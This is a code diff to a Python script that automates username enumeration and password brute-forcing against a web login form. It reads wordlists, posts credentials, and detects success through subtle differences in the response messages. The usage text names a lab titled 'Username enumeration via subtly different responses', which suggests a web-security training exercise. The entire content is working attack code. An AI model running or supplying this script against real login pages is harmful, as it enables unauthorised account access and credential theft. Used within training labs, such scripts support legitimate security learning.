@@ -2,6 +2,7 @@ import requests
 import sys
 import os
 import getopt
+import re
 
 
 def clear_screen():
@@ -12,39 +13,47 @@ def clear_screen():
 
 
 def get_username(url, session):
-  usernames = open('usernames.txt', 'r')
+  usernames = open('./usernames.txt', 'r')
+  regex = r'-warning>(.*?)</p>'
 
   for username in usernames:
     username = username.strip()
     data = {'username' : username, 'password' : 'a'}
-    post_r = session.post(url, data = data)
+    post_request = session.post(url, data = data)
+    text = post_request.text
+    login_message = re.search(regex, text).group(1)    
     clear_screen()
     print(f"[!] The username is: \"{username}\"")
 
-    if "Invalid username" not in post_r.text:
+    if "." not in login_message:
       valid_username = username
       clear_screen()
       print(f"[*] The username is: \"{valid_username}\"")
       usernames.close()
       break
 
+  usernames.close()
+  
   return valid_username
 
 
 def get_password(url, session, valid_username):
-  passwords = open('passwords.txt', 'r')
+  passwords = open('./passwords.txt', 'r')
 
   for password in passwords:
     password = password.strip()
-    obj = {'username' : valid_username, 'password' : password}
-    post_r = session.post(url, data = obj)
+    data = {'username' : valid_username, 'password' : password}
+    post_request = session.post(url, data = data)
+    text = post_request.text
     clear_screen()
     print(f"[*] The username is: \"{valid_username}\"\n[!] The password is: \"{password}\"")
 
-    if "Incorrect password" not in post_r.text:
+    if "Invalid username or password" not in text:
       valid_password = password
       passwords.close()
       break
+ 
+  passwords.close()
 
   return valid_password
 
@@ -53,7 +62,7 @@ def main(argv):
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
+    print("This is the script for:\n'Username enumeration via subtly different responses'\n\nUsage: python3 auth-2.py -u <url>/login")
     print("\x1b[?25h")
     sys.exit(2)
 
@@ -61,7 +70,7 @@ def main(argv):
     if opt == "-u":
       url = arg
     elif opt == "-h":
-      print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
+      print("This is the script for:\n'Username enumeration via subtly different responses'\n\nUsage: python3 auth-2.py -u <url>/login")
       print("\x1b[?25h")
       sys.exit()
 
